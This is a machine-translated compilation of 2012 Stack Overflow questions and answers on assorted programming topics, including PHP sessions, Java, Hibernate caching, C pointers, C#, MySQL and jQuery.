ini_set('session.cookie_lifetime', '0');
require_once 'init.php'; 

session_start();

?> 
```

init.php 如下：

```
 <?php
 session_save_path('Session'); 
 ?> 
```

现在在 12 小时后用户下次刷新页面时，由于会话将被销毁，它会进入注销页面：

```
 if ((isset($username)) && (isset($userid))){
        session_destroy();
        echo "You have been Logged Out | <a href='./home.php'>Home</a>";
    }

    else {

        echo "You are Not Logged In";

    } 
```

显然，如果用户单击注销页面，那么它会导航到上面的脚本。

但这是一个好方法吗？有没有更方便的方法，因为如果您查看适当的 Web 应用程序，它们可以让用户保持登录数天，但他们是如何做到的呢？

谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-07T13:53:51.120

会话将在紧要关头进行，它们足够安全（尽管不要引用我的话），但根据服务器使用情况和配置，您的会话可能会在 12 小时之前被清除。

登录后，我启动一个会话**并将**cookie 保存到他们的计算机上。此 cookie 包含一个唯一生成的字符串及其帐户 ID。

当他们刷新页面时，将运行以下命令（伪代码）：

```
if (session_exists) continue();
else if (!session_exists AND cookie_exists AND validate_cookie()) {
    login_user_via_cookie();
    continue();
else show_login_page(); 
```

# java - 无法使用 Sublime Text 2、Ubuntu 12.04 64 编译 Java

> ID：13271147
> 
> 赞同：2
> 
> 时间：2012-11-07T13:50:23.730
> 
> 标签：java, ubuntu, sublimetext2

我正在尝试在我的 Ubuntu 12.04 (Precise Pangolin) 64 位系统上使用[Sublime Text 2 编译和运行 .java 文件，但出现了一些错误。](http://en.wikipedia.org/wiki/Sublime_Text)

我的`java -version output`：

```
java version "1.7.0_09"
Java(TM) SE Runtime Environment (build 1.7.0_09-b05)
Java HotSpot(TM) 64-Bit Server VM (build 23.5-b02, mixed mode) 
```

这是我的`JavaC.sublime-build`文件内容：

```
{
    "cmd": ["javac", "$file_name","&&","java", "$file_base_name"],
    "file_regex": "^(...*?):([0-9]*):?([0-9]*)",
    "selector": "source.java",
    "shell": true
} 
```

最后是我的`.java`文件，`bob.java`

```
public class bob{
    public static void main(){
        System.out.println("Sublime Text 2!");
    }
} 
```

[这是结果。](http://i.stack.imgur.com/AKNAM.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-18T09:43:12.223

我认为 Sublime Text 2 处理 cmd 标签的方式发生了格式变化。另一种解决方案是：

```
{
    "cmd": ["javac", "$file_name"],
    "cmd": ["java", "$file_base_name"],
    "working_dir": "${project_path:${folder}}",
    "selector": "source.java"
} 
```

致谢：[DevinClark / JavaCandR.sublime-build](https://gist.github.com/1633819)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T16:04:05.923

这解决了我的问题：

```
{
    "cmd": ["javac \"$file_name\" && java \"$file_base_name\""],
    "shell": true,
    "file_regex": "^(...*?):([0-9]*):?([0-9]*)",
    "selector": "source.java"
} 
```

Ubuntu 12.04 64 位，崇高文本 2。

# java - 在 Java 中针对时间对数据库表执行循环轮询

> ID：13271149
> 
> 赞同：1
> 
> 时间：2012-11-07T13:50:26.037
> 
> 标签：java, database

我被要求通过 java 为我的项目对数据库表进行循环轮询。我是使用 eclipse 的 Java 初学者，到目前为止，我只成功地将 Java 连接到 oracle 并将其转换为 pojo 对象。你能指导我吗...如何进行...？她是我的密码

```
public static void main(String[] args) throws SQLException {

    DummyClass dc = new DummyClass();

    Connection conn = null;
    Statement st = null;
    ResultSet rs = null;

    try {
        System.out.println("JDBC connection");
        DriverManager.registerDriver(new oracle.jdbc.driver.OracleDriver());
         conn = DriverManager.getConnection( "jdbc:oracle:thin:@VM-SALES-MB:1521:SALESDB1", "bdeuser", "edb" );
          st = conn.createStatement();
          rs = st.executeQuery( "select * from msg_new_to_bde" );
        conn = DriverManager.getConnection(
                "jdbc:oracle:thin:@VM-SALES-MB:1521:SALESDB1", "bdeuser",
                "edb");
        st = conn.createStatement();
        rs = st.executeQuery("select * from msg_new_to_bde");*/

        Collection<KpiMessage> pojoCol = new ArrayList<KpiMessage>();
    while (rs.next()) {             
        KpiMessage filedClass = dc.convertRecordsetToPojo(rs);
            pojoCol.add(filedClass);

        }
        for (KpiMessage pojoClass : pojoCol) {
        System.out.print(pojoClass.getSequence());
        System.out.print(pojoClass.getTableName());
        System.out.print(pojoClass.getEntryTime());
        System.out.print(pojoClass.getProcessingTime());
        System.out.println(pojoClass.getStatus());
        }
        System.out.print(pojoCol.size());

        System.out.println(pojoCol.size());
        System.out.println("close connection");

    } catch (Exception e) {
        e.printStackTrace();
    } finally {
        try {
            rs.close();
            st.close();
            conn.close();

        } catch (Exception se) {
            se.printStackTrace();
        }

    }

}

/**
 * Converts a provided recordeset to a {@link KpiMessage}.
 * 
 * The following attributs are copied from recordset to pojo:
 * 
 * <ul> 
 * <li>SEQ</li>
 * <li>TABLENAME</li>
 * <li>ENTRYTIME</li>
 * <li>STATUS</li>
 * </ul>
 * 
 * @param rs the recordset to convert
 * @return the converted pojo class object
 * @throws SQLException if an sql error occurrs during processing of recordset
 */
private KpiMessage convertRecordsetToPojo(ResultSet rs) throws SQLException {

    KpiMessage msg = new KpiMessage();

    int sequence = rs.getInt("SEQ");
    msg.setSequence(sequence);
    String tablename = rs.getString("TABLENAME");
    msg.setTableName(tablename);
    Timestamp entrytime = rs.getTimestamp("ENTRYTIME");
    Date entryTime = new Date(entrytime.getTime());
    msg.setEntryTime(entryTime);
    Timestamp processingtime=rs.getTimestamp("PROCESSINGTIME");
    if(processingtime!=null){
        Date processingTime = new Date(processingtime.getTime());
        msg.setProcessingTime(processingTime);   
    }

    int status = rs.getInt("STATUS");
    msg.setStatus(status);
    return msg;

} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:54:02.403

将你的 main() 方法重命名为 main2 并添加这个：

```
public static void main(String[] args)  {
   while(true) {
       main2(args);
       Thread.sleep(10*60*1000);  // 10 minutes
   }
} 
```

这不是很好的代码，但有效。

# php - CodeIgniter：在每个库中加载模型或将模型从控制器内“传递”到库中

> ID：13271151
> 
> 赞同：2
> 
> 时间：2012-11-07T13:50:29.997
> 
> 标签：php, codeigniter

我目前正在使用 CodeIgniter。我的前端控制器根据他获得的输入加载 2 个库中的 1 个。这两个库都需要访问模型。我的问题：我应该在每个库中加载模型（加上每个库中 CI 的 get_instance() 甚至可以访问 CI 加载函数）还是有任何“更好”的解决方案可以在 Frontcontroller 和“通过”中加载模型模型到一个或另一个库。我什至检查了自动加载的可能性，但即便如此我也无法从库中直接访问。我想这不是在每个库中加载模型的最佳解决方案（例如，如果我需要更多库等等），但我现在有点卡住了.. :-(
简而言之：
-将模型加载到FrontController 并且可能“通过”
- 或者在任何库中获取 CI 实例，然后加载模型（并编写冗余代码）
- 或者有更好的解决方案吗？

提前谢谢:-)

## 编辑：

我选择：
public function __construct()
{
$this->ci_instance =& get_instance();
$this->ci_instance->load->model('my_model');
$this->_model = $this->ci_instance->my_model;
}

然后使用这样的函数：
$mysql_result = $this->_model->get_testdata();

它比 tank auth lib 中的解决方案短一点（但几乎相同）。:-) 但是 Tank Auth Lib 也帮助了我（看看专业人士是如何做到的）。也感谢 dm03514！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:00:11.407

get_instance 是官方文档建议的原生方式：

为了更轻松地访问模型对象，我将在您的库中定义一个属性：

```
public $_model = FALSE; 
```

在您的图书馆建设者的某个地方：

```
$CI =& get_instance();
$CI->load->model('model_name');
$this->_model = $CI->model_name; 
```

然后您可以通过调用以任何库方法访问模型`$this->_model->method();`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T14:00:58.840

每当我有这样的大问题时，我通常会查看一些流行的库，例如`Tank Auth`. 库/模型在类中加载。这使您的图书馆自给自足和封闭，这不依赖于您的 intiliaztion 参数。

在已经加载后重新加载库只是一个条件输入，`Loader.php`并且性能并不高。

# hibernate - hibernate - 在没有集合的情况下缓存由存储库访问的集合

> ID：13271154
> 
> 赞同：2
> 
> 时间：2012-11-07T13:50:37.653
> 
> 标签：hibernate, caching, domain-driven-design

通常在休眠中，我们与 s 有很多父/子关系`HashSet`。所以父母有一组孩子。这可以通过休眠集合缓存轻松缓存在二级缓存中。当您向集合中添加或删除对象时，缓存将失效。

现在我们要删除父对象上的设置关系。这是因为遵循 DDD（域驱动设计）语义，子级不是父级聚合根的一部分。孩子本身就是一个聚合根。但是子类仍然与父类有关系。

因此，我们开始使用存储库通过以下方法访问子代：

```
public Set<Child> getChildren(Parent parent) {
    Criteria criteria = getSession().createCriteria(Child.class);
    criteria.add(Restrictions.naturalId().set("parent", parent));
    criteria.setCacheable(true); // does not work here!
    return criteria.list();
} 
```

问题是`setCacheable`. 因为我们的孩子有两个 naturalId 是父母和它自己的 naturalId （例如一个名字）。

如果我只使用两个 naturalId 中的一个，则带有 naturalIds 的休眠查询缓存不起作用，因为 hibernate 无法识别使用 save() 或 delete() 等存储库方法添加或删除更多实体。

当我们不使用它时，`Restrictions-naturalId()`我们可以使用普通的查询缓存，但是如果添加或修改任何子缓存，这个缓存就会失效。这是查询缓存的常见问题，并非特定于我们的问题。

因此，我们尝试编写自己的 CollectionRepository，最终得到这样的类：

```
public abstract class CollectionRepositoryHibernate<T extends PersistableEntity, E extends PersistableEntity> extends StandardRepositoryHibernate<T> implements
        CollectionRepository<T, E>
{
    private Class<T>    entityClass = getGenericClass();
    private Class<E>    parentClass = getGenericParentClass();

    @Override
    public void save ( T persistableEntity )
    {
        evictCache(persistableEntity);
        super.save(persistableEntity);
    }

    @Override
    @SuppressWarnings("unchecked")
    public List<T> getCollection ( E persistableEntity )
    {
        return getNaturalCollectionCriteria(persistableEntity).list();
    }

    protected Criteria getNaturalCollectionCriteria ( E persistableEntity )
    {
        Criteria criteria = getSession().createCriteria(entityClass);
        criteria.add(Restrictions.naturalId().set(getPropertyName(), persistableEntity));
        criteria.setCacheable(true);
        criteria.setCacheRegion(getCacheRegion(persistableEntity.getId()));
        return criteria;
    }

    private String getPropertyName ( )
    {
        ClassMetadata classMetadata = getSession().getSessionFactory().getClassMetadata(entityClass);
        int[] naturalIdentifierProperties = classMetadata.getNaturalIdentifierProperties();
        String[] propertyNames = classMetadata.getPropertyNames();
        for (int i : naturalIdentifierProperties)
        {
            String propertyName = propertyNames[i];
            try
            {
                Field field = entityClass.getDeclaredField(propertyName);
                Class<?> type = field.getType();
                if (type.equals(parentClass))
                {
                    return propertyName;
                }
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }
        }
        throw new IllegalStateException("No property name found");
    }

    private void evictCache ( T persistableEntity )
    {
        Cache cache = getSession().getSessionFactory().getCache();
        String cacheRegion = getCacheRegion(getCollectionId(persistableEntity));
        cache.evictQueryRegion(cacheRegion);
    }

    protected String getCacheRegion ( Integer id )
    {
        return entityClass + "#" + id;
    }

    @Override
    public void delete ( T persistableEntity )
    {
        evictCache(persistableEntity);
        super.delete(persistableEntity);
    }

    protected Integer getCollectionId ( T persistableEntity )
    {
        try
        {
            Field field = persistableEntity.getClass().getDeclaredField(getPropertyName());
            field.setAccessible(true);
            PersistableEntity parentEntity = (PersistableEntity) field.get(persistableEntity);
            return parentEntity.getId();
        }
        catch (Exception e)
        {
            throw new IllegalStateException("no collection id found, e");
        }
    }

    @SuppressWarnings("unchecked")
    protected Class<E> getGenericParentClass ( )
    {
        Class<E> result = null;
        Type type = this.getClass().getGenericSuperclass();

        if (type instanceof ParameterizedType)
        {
            ParameterizedType pt = (ParameterizedType) type;
            Type[] fieldArgTypes = pt.getActualTypeArguments();
            result = (Class<E>) fieldArgTypes[1];
        }
        return result;
    }
} 
```

**我们在这里使用的技巧是每个集合有一个缓存区域。**

当涉及到保存或删除时，我们会驱逐这个缓存区域。它工作正常，但有一些缺点：

*   我们需要很多缓存区域。到目前为止，我们不知道是否存在一些限制或性能考虑。
*   由于在无法配置缓存区域之前不知道缓存区域的名称，例如设置最大元素数或生存时间

摘要：我们不希望在我们的父母中设置一个集合。我们需要有二级集合缓存，如果添加或删除实体，它并不总是无效（就像通常的查询缓存一样）。

您是否知道拥有未与集合中的父/子关系映射的集合缓存的正确方法？

# c# - 从 HttpWebResponse 反序列化 JSON 的方法

> ID：13271158
> 
> 赞同：4
> 
> 时间：2012-11-07T13:50:56.653
> 
> 标签：c#, asp.net, json

我试图找出在 .NET 3.5 中解析传入 JSON 服务器端的最佳方法。我从 JSON 格式的 HttpWebResponse 接收“标题”。所以我必须检索每个标题并存储在数据库中。所以请提供检索每个标题的代码。

```
public class MyObject
{
    public ArrayList list { get; set; }
}

    var request = WebRequest.Create("https://api.dailymotion.com/videos?fields=description,thumbnail_medium_url%2Ctitle&search=Good+Morning");
    using (var twitpicResponse = (HttpWebResponse)request.GetResponse())
    {
        using (var reader = new StreamReader(twitpicResponse.GetResponseStream()))
        {
            JavaScriptSerializer js = new JavaScriptSerializer();
            string objText = reader.ReadToEnd();
            MyObject myojb = (MyObject)js.Deserialize(objText, typeof(MyObject));
        }
    } 
```

我在 myojb 中收到标题，但如何从 myojb 中检索每个标题。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-07T14:25:18.080

使用这段代码片段`Title`通过使用`dynamic`对象来获取。

**.NET 4.0 及更高版本**

```
JavaScriptSerializer js = new JavaScriptSerializer();
var obj = js.Deserialize<dynamic>(reader.ReadToEnd());
foreach (var o in obj["list"])
{
    var title = o["title"];
} 
```

**.NET 3.5 及以下**

```
JavaScriptSerializer js = new JavaScriptSerializer();
var obj = js.Deserialize<Dictionary<string, object>>(reader.ReadToEnd());
foreach (var o in (ArrayList)obj["list"])
{
    if (o is Dictionary<string, object>)
        var title = (o as Dictionary<string, object>)["title"];
} 
```

**使用 Linq：**

```
JavaScriptSerializer js = new JavaScriptSerializer();
var obj = js.Deserialize<Dictionary<string, object>>(reader.ReadToEnd());
var titles = ((ArrayList)obj["list"]).Cast<Dictionary<string, object>>()
                 .Select(s => s["title"].ToString()).ToArray<string>(); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-07T13:59:02.143

序列化为`dynamic`对象

```
using (var reader = new StreamReader(twitpicResponse.GetResponseStream()))
{
    JavaScriptSerializer js = new JavaScriptSerializer();
    var objects = js.Deserialize<dynamic>(reader.ReadToEnd());
    foreach (var o in objects)
    {
        Console.WriteLine(o["title"]);
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T13:58:19.360

“我正在尝试找出解析传入 JSON 的最佳方法”

我会使用 json.net。反序列化/序列化 json 数据非常容易。

看看这里：

[如何将 JSON 发布到服务器？](https://stackoverflow.com/questions/9145667/how-to-post-json-to-the-server-using-c/10027534#10027534)

# objective-c - Apple 是如何实现 NSSet 的？

> ID：13271160
> 
> 赞同：5
> 
> 时间：2012-11-07T13:51:01.090
> 
> 标签：objective-c, nsset

Apple 的文档目前不记录 NSSet 的“身份”概念。

我有一些似乎来自 Apple 代码的错误。例如，“[NSMutableSet minusSet]”从来没有像记录的那样对我有用——但我很确定这是因为“身份”。

例如来自：http: [//developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSSet_Class/Reference/Reference.html#//apple_ref/occ/cl/NSSet](http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSSet_Class/Reference/Reference.html#//apple_ref/occ/cl/NSSet)

> 包含对象：
> 
> 返回一个布尔值，指示给定对象是否存在于集合中。
> 
> 如果集合中存在anObject，则为YES，否则为NO。

这意味着什么？

仅供参考我尝试过的事情：

1.  在集合中的所有类上实现“isEqual:”
2.  检查所有类都是同一个类（没有子类/超类混淆）
3.  对集合中的所有类实施 NSCopying（无效）

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-07T13:55:44.493

在 Cocoa 中，对象相等是通过使用`isEqual:` **and** `hash:`

[https://developer.apple.com/library/ios/#documentation/Cocoa/Reference/Foundation/Protocols/NSObject_Protocol/Reference/NSObject.html](https://developer.apple.com/library/ios/#documentation/Cocoa/Reference/Foundation/Protocols/NSObject_Protocol/Reference/NSObject.html)

从注释中`isEqual:`：

> 如果两个对象相等，则它们必须具有相同的哈希值。如果您在子类中定义 isEqual: 并打算将该子类的实例放入集合中，那么最后一点尤其重要。确保您还在子类中定义哈希。

您的子类将需要实现这两个，以便它们返回相同的东西。一旦他们这样做了，就可以在 Cocoa Collections 中正确使用它们。

您的`NSSet`相等性不起作用的原因是因为集合使用哈希（它存储为哈希表），因此如果您只实现`isEqual:`，那么它们的哈希有可能（很好的机会）会不同。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-07T13:53:05.363

`NSSet`是经典意义上的哈希集，因此您必须实现该`hash`方法以确保对象被识别为相等。默认情况下，`hash`只返回转换为无符号整数的对象的指针，该整数对于每个对象都是唯一的，因此即使返回 true 的对象`isEqual:`也不会被识别为这样。如果您对它的工作方式感兴趣`NSSet`，可以查看[`CFSet`源代码](http://opensource.apple.com/source/CF/CF-550/CFSet.c)，它是`NSSet`.

# mysql - 如何返回一个表中的行，其字段包含另一个表中任何行的字符串？

> ID：13271161
> 
> 赞同：1
> 
> 时间：2012-11-07T13:51:04.383
> 
> 标签：mysql, join, full-text-search, match

我在 MySQL 5.6 中有以下表结构：

```
CREATE TABLE `dictionary` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `word` varchar(80) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `word` (`word`)
) ENGINE=InnoDB;

CREATE TABLE `sentences` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `sentence` varchar(254) NOT NULL,
  PRIMARY KEY (`id`),
  FULLTEXT KEY `sentencefulltext` (`sentence`)
) ENGINE=InnoDB; 
```

我想返回包含字典中任何单词的所有句子。我真的不关心单词边界，它可以是一个基本的子字符串。

全文 MATCH AGAINST 似乎只适用于字符串，而不是从另一个表中选择。至于 LIKE 和 REGEXP，它们似乎需要很长时间，因为我的字典中有大约 500k 行句子和 50k 行单词。

一种选择是在程序中逐行浏览字典并在每一行上调用一个选择，但我宁愿在单个 SQL 语句中执行此操作。

如果有人有任何想法，请分享。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T13:58:39.647

尝试这样的事情 -

```
 SELECT *
      FROM `sentences`,'dictionary'
     WHERE INSTR(word,''+sentence+'') > 0 
```

当您将 like 与 % 符号一起使用时-没有索引，这就是它太慢的原因，因此您可能需要全文搜索：

[http://dev.mysql.com/doc/refman/5.5/en/fulltext-search.html](http://dev.mysql.com/doc/refman/5.5/en/fulltext-search.html)

# c - 将循环中的值分配给字符指针数组

> ID：13271168
> 
> 赞同：0
> 
> 时间：2012-11-07T13:51:25.617
> 
> 标签：c, arrays, pointers, char

我不能在循环中为 char 数组赋值，这样做在每个数组值中都包含相同的值

例如这有效

```
char* foo[3];

foo[0] = "mango"; foo[1] = "kiwi"; foo[2] = "banana";

int i=0; for(i=0;i<3;i++) 
{
   printf("%s\n",foo[i]); 
} 
```

但这没有，我不明白为什么。

```
char* foo[3]; int i=0;

for(i=0;i<3;i++) {
  char temp[5];
  sprintf(temp,"VAL:%d",i);
  foo[i] = temp; 
}

for(i=0;i<3;i++) 
{
  printf("%s\n",foo[i]); 
} 
```

请提前帮助和感谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T13:53:20.483

第二个片段中的问题是所有元素都`foo`指向同一个变量 ，`temp`当第二个片段被执行时，它超出了范围`for`，这是未定义的行为。即使它没有超出范围，所有元素`foo`都会指向相同的缓冲区，这是不正确的。

要更正，您需要制作副本`temp`并将其存储在`foo`. 这可以通过使用`strdup()`if available （如果不是`malloc()`and `strcpy()`）来实现：

```
for (i = 0; i < sizeof(foo)/sizeof(foo[0]); i++)
{
    char temp[6];
    snprintf(temp, sizeof(temp), "VAL:%d", i);
    foo[i] = strdup(temp); /* Must be free()d later. */
} 
```

或更改类型`foo`（如[unwind](https://stackoverflow.com/users/28169/unwind)已建议）：

```
char foo[3][6];
int i;
for (i = 0; i < sizeof(foo)/sizeof(foo[0]);i++)
{
    snprintf(foo[i], sizeof(foo[i]), "VAL:%d", i);
} 
```

其他变化：

*   增加 to 的大小，`temp`因为`6`它需要`5`字符`VAL:%d` *加上*.附加的空终止符`sprintf()`。因此，发布的代码有缓冲区溢出。
*   使用[`snprintf()`](http://en.cppreference.com/w/c/io/fprintf)以避免缓冲区溢出。
*   使用`sizeof(foo)/sizeof(foo[0])`来计算数组中的元素数量，`foo`而不是对元素数量进行硬编码。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T14:04:54.920

您必须记住，在 C 中，a`char*`实际上并不存储字符串，而是存储将被视为字符串的第一个字符的内存位置的地址。

在您的第一个示例中，数组的每个元素都`foo`包含不同字符串文字的地址。在您的第二个示例中，数组的每个元素都`foo`指向局部变量`temp`。尽管循环中的每次迭代都会产生一个单独的实例`temp`，但任何理智的编译器都会将所有这些实例放在彼此之上，从而提供您所体验的结果。

解决方案是使用二维数组：

```
char foo[3][6]; int i=0;

for (i=0; i<3; i++) { sprintf(foo[i],"VAL:%d", i); }

for (i=0; i<3; i++) { printf("%s\n", foo[i]); } 
```

或者使用动态分配：

```
char* foo[3]; int i=0;

for (i=0; i<3; i++) { char* temp = malloc(6); sprintf(temp, "VAL:%d", i); foo[i] = temp; }

for (i=0; i<3; i++) { printf("%s\n", foo[i]); free(foo[i]); } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T13:54:32.943

循环中的`temp`变量可能在每次迭代中重复使用相同的内存，因此您最终将相同的地址写入每个`foo[]`插槽。然后，更糟糕的是，当您退出循环时，该地址变得无法访问，从而导致未定义的行为。

您需要动态分配每个字符串，或者使用带有空间的字符串数组来存储实际字符串（`char foo[3][20];`或其他内容）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-07T13:54:33.450

两个问题：

1）您已声明`temp`为`char temp[5]`并且您正在填充超过 4 个字符：

```
sprintf(temp,"VAL:%d",i); 
```

在那里通过导致 sprintf 写入超出数组的末尾，因为它必须写入终止`\0`

2) 该变量`temp`是 for 循环的本地变量，一旦循环结束，它就会超出范围。

# twitter-bootstrap - Twitter Bootstrap - 打开和关闭 div

> ID：13271172
> 
> 赞同：3
> 
> 时间：2012-11-07T13:51:30.573
> 
> 标签：twitter-bootstrap

我是 Twitter Bootstrap 框架的新手。我想从一个按钮打开和关闭一个 div。怎么做？

谢谢乌利

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-07T22:11:22.880

[这在bootstrap docs](http://twitter.github.com/bootstrap/javascript.html#collapse)中有明确的介绍。

不需要 JS（除了包括引导 JS）。一切都是通过数据属性完成的。

```
<button type="button" class="btn btn-danger" data-toggle="collapse" data-target="#demo">
  simple collapsible
</button>

<div id="demo" class="collapse in"> collapse </div>​ 
```

这是一个演示：http: [//jsfiddle.net/3UubF/](http://jsfiddle.net/3UubF/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T13:58:46.113

你的意思是显示和隐藏？如果是这样，我只会使用 jQuery。它是 Bootstrap 的首选 js 框架。我会做这样的事情...

```
<a class="btn" id="togglemydiv">My Button</a>

$('#togglemydiv').on('click', function()   { $('#targetdiv').toggleClass('hide'); }); 
```

# qt - qt interface builder中有没有办法将窗口设置为出现在屏幕中央

> ID：13271178
> 
> 赞同：0
> 
> 时间：2012-11-07T13:51:42.793
> 
> 标签：qt, qt-creator

当我展示我的窗户时，它们会偏离中心。我已经看到通过将窗口位置设置为相关屏幕坐标来解决此问题的示例。但是有没有办法通过 UI Designer 来做到这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T00:23:21.683

您可以通过使用来实现这一点

```
 setWindowFlags(Qt::FramelessWindowHint);

    setWindowModality(Qt::ApplicationModal); 
```

请参考这个例子：

[http://doc.qt.io/qt-4.8/qt-widgets-windowflags-example.html](http://doc.qt.io/qt-4.8/qt-widgets-windowflags-example.html)

# jquery - Colour should change of first div 'li' element after drag and drop to another div li

> ID：13271182
> 
> 赞同：0
> 
> 时间：2012-11-07T13:51:57.063
> 
> 标签：jquery, css, html, draggable

When I drag and drop elements `li` of first `div` to another `div` i.e "Add your Stories here" box then contents gets dropped. However what I need that the colour of dragged element should change as it has been dropped to `div` 2 i.e `id = dialogIteration`.So that I may know which elements have been dragged and dropped and which are left to be dragged. Here is my running code to drag and drop.

[http://jsfiddle.net/coolanuj/7683X/25/]

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:08:46.983

Select the srcElement of the event in your drop function, and then go from there.

```
drop: function(event, ui) {
    $(event.srcElement).css('color', 'green');
    $(this).find(".placeholder").remove();
    $("<li></li>").text(ui.draggable.text()).appendTo(this);
}
​ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:04:10.740

How do you make your li draggable? via jQuery UI? if so, you can use the event `stop( event, ui )`

it's Triggered when dragging stops.

You can call an eventhandler on stop().

jQuery:

```
$('body').on('stop','#dialogIteration',function(){

// highlight your dragged <li> item
$(this).toggleClass('highlight',true);

}); 
```

CSS:

```
.highlight{
background-color: yellow;
} 
```

# java - 如何使用 Java 加密 PDF？

> ID：13271184
> 
> 赞同：6
> 
> 时间：2012-11-07T13:52:08.840
> 
> 标签：java, pdf, cryptography, encryption

我一直在尝试使用 Java 加密 PDF。到目前为止，我可以成功加密其他文件类型（.txt、.png 等）。当我使用 PDF 进行操作时，它会在我解密时破坏其中的信息。

这是我用来加密它的：

```
public byte[] cryptograph(Key key, byte[] content){
    Cipher cipher;
    byte[] cryptograph = null;
    try {
        cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, key);
        cryptograph = cipher.doFinal(content);
    } catch (Exception e) {
        e.printStackTrace();
    }
    return cryptograph;

} 
```

这是解密它：

```
public byte[] decrypt(Key key,byte[] textCryp){
    Cipher cipher;
    byte[] decrypted = null;
    try {
        cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, key);
        decrypted = cipher.doFinal(textCryp);
    } catch (Exception e) {         
        e.printStackTrace();
    } 

    return decrypted;
} 
```

更新：

这是我用来读取文件的：

```
public byte[] getFile(){
    byte[] content = null;
    try {
        InputStream is = new FileInputStream("test.pdf");
        BufferedInputStream vf = new BufferedInputStream(is);
        content = new byte[vf.available()];
        vf.read(content);
    } catch (FileNotFoundException e) {
        e.printStackTrace();
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
    return content;
} 
```

使用它来重写文件

```
public static void saveDecrypt(byte[] bytes) throws IOException{
        Document doc=new Document();
        try {
            PdfWriter.getInstance(doc,new FileOutputStream("fileDecrypted.pdf"));
            doc.open(); 
            doc.add(new Paragraph(new String(bytes)));
            doc.close();
        } catch (DocumentException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-07T14:57:16.113

您的`saveDecrypt`方法似乎使用 iText 作为 PDF 库。你不需要这样做，事实上你不应该这样做！您在读取时将 PDF 文件简单地视为一系列字节，因此在写入时您应该执行完全相同的操作。

只需使用您解密的字节并将它们写入文件`FileOutputStream`！

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-07T14:14:28.480

我担心你的文件读取代码可能是罪魁祸首。该[`InputStream.available()`](http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#available%28%29)方法仅返回可读取的字节数的估计值。我建议您使用[Google 替代方法](https://www.google.co.uk/search?q=java+read+file+to+byte+array)将整个文件读取到字节数组，或考虑使用库方法，例如 Apache Commons[`FileUtils.readFileToByteArray(File file)`](http://commons.apache.org/io/api-release/org/apache/commons/io/FileUtils.html#readFileToByteArray%28java.io.File%29)或[`IOUtils.toByteArray(InputStream input)`](http://commons.apache.org/io/api-release/org/apache/commons/io/IOUtils.html#toByteArray%28java.io.InputStream%29).

作为辅助检查，我建议您在加密之前和解密之后对文件内容进行字节数组比较。我怀疑它们将是相同的（进一步表明文件读取和/或写入是罪魁祸首）。

# combobox - 如何在智能 gwt 中取消编辑组合框文本

> ID：13271187
> 
> 赞同：2
> 
> 时间：2012-11-07T13:52:23.320
> 
> 标签：combobox, smartgwt

在 smartgwt 中，当我关注组合框的选定值时，选定的值正在编辑。我希望选择的值变得不可编辑。我将如何做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T07:23:28.130

当您说**组合框**时，您必须使用`ComboBoxItem`. `ComboBoxItem`这是和之间的基本区别`SelectItem`。为了满足您的要求，您需要使用`SelectItem`而不是`ComboBoxItem`.

# c# - 如何用名字创建游戏高分？

> ID：13271191
> 
> 赞同：0
> 
> 时间：2012-11-07T13:52:48.783
> 
> 标签：c#

我有一个简单的游戏，我想用名字保存高分，然后在另一个表单上显示它，但按分数的降序排列。我想用 txt 文件来做，保存没问题，我只保存如下：Adam,200,John,100 等。显示它们也不是问题，但如何对它们进行排序？那么如何将分数与名称联系起来呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T13:54:33.313

您需要以更明显的结构方式存储它们。因此，例如，您仍然可以使用文本文件，每行一个条目：

```
Adam,200
John,200 
```

ETC

然后，您将从文件中*读取*它们，将每一行解析为一个`HighScoreEntry`对象（当然，您必须创建`HighScoreEntry`类），并将其添加到列表中。或者使用 LINQ 进行转换：

```
var highScoreEntries = File.ReadLines("highscores.txt")
                           .Select(line => HighScoreEntry.FromLine(line))
                           .ToList(); 
```

然后你可以使用：

```
var orderedScores = highScoreEntries.OrderByDescending(entry => entry.Score); 
```

或者，您可以使用 XML 之类的东西来存储分数，这将提供更多的结构，并使某些解析稍微容易一些。

如果所有这些听起来都太难了，请尝试确定哪个确切步骤导致您出现问题。

* * *

## 回答 #2

> 赞同：0
> 
